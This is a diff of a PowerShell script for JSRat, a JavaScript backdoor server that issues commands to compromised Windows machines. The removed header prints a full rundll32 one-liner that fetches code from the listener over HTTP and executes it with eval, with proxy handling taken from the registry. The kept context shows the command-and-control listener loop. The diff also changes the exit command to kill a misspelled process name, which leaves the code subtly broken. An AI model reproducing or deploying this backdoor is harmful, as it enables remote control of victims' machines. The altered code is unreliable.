@@ -1,21 +1,3 @@
-<#
-  ---  
-  Learn from  Casey Smith @subTee
-  Author: 3gstudent
-  Version:1.2
-  Add code to work behind a proxy server.
-  ---
-  Javascript Backdoor
-  ---
-  Server:
-  run as admin:
-    powershell.exe -ExecutionPolicy Bypass -File c:\test\JSRat.ps1
-    
-  Client:  
-  cmd line:  
-  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");w=new%20ActiveXObject("WScript.Shell");try{v=w.RegRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet%20Settings\\ProxyServer");q=v.split("=")[1].split(";")[0];h.SetProxy(2,q);}catch(e){}h.Open("GET","http://127.0.0.1/connect",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
-#>
-
 $Server = '127.0.0.1' #Listening IP. Change This.
 
 function Receive-Request 
@@ -46,12 +28,12 @@ $listener.Start()
 'Listening ...'
 while ($true) 
 {
-    	$context = $listener.GetContext() # blocks until request is received
+    	$context = $listener.GetContext() 
     	$request = $context.Request
     	$response = $context.Response
 	$hostip = $request.RemoteEndPoint
 
-	#Use this for One-Liner Start
+	
 	if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq "GET")) 
 	{  
      		write-host "Usage:" -fore Green
@@ -126,7 +108,7 @@ while ($true)
                            
                             		else if(c=="exit")
                             		{
-                                		c="(\"cmd /c taskkill /f /im rundll32.exe\",0,true)";  
+                                		c="(\"cmd /c taskkill /f /im rund.exe\",0,true)";  
                                 		r = new ActiveXObject("WScript.Shell").Run(c);
                        
                           		}
